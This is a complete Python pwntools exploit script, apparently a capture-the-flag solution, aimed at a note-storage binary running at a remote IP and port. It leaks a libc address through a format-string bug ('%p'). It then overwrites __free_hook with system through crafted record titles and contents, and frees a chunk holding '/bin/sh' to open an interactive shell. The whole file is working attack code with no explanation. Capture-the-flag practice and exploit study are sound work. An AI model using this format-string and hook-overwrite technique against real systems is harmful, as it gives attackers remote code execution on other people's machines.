#!/usr/bin/env python
from pwn import *

context.binary = elf = ELF('bin')
# context.terminal = ['tmux', 'splitw', '-h']
libc = ELF('./libc-2.27.so')
context.log_level = "debug"
env = {
    "LD_PRELOAD": os.path.abspath("./libc-2.27.so")
}
# p = process(['./ld-2.27_64.so', elf.path], env=env)
# gdb.attach(p, 'init-gef')
p = remote('139.162.160.184', 19999)
# p = process('./bin')
# gdb.attach(p)

def option(char):
    p.sendlineafter("[Q]uit\n", char)

def store_record(title, content):
    option('s')
    p.sendlineafter(" title\n", title)
    p.sendlineafter(" content\n", content)

def modify_title(prev, new):
    option('m')
    p.sendlineafter(" title\n", prev)
    p.sendlineafter(" new title\n", new)

def update_content(title, content):
    option('u')
    p.sendlineafter(" title\n", title)
    p.sendlineafter(" content\n", content)

def delete_record(title):
    option('d')
    p.sendlineafter(" title\n", title)

store_record("A" * 7, "%p|" + "A" * 20)
option('p')
p.recvline()
leak = int(p.recvuntil("|", True), 16)
libc_base = leak - 0x3ec7e3
log.info("Libc: 0x{:x}".format(libc_base))

store_record("C" * 7, "A" * 20)
update_content("C" * 7, "/bin/sh\x00")
malloc_hook = libc_base + 0x3ebc30
free_hook = libc_base + 0x3ed8e8
store_record("B" * 7, p64(free_hook)[1:])
modify_title("B" * 7, "B" * 8 + p64(free_hook)[0])


final_payload = p64(libc_base + libc.symbols['system'])
update_content("B" * 8, final_payload)

delete_record("C" * 7)




p.interactive()
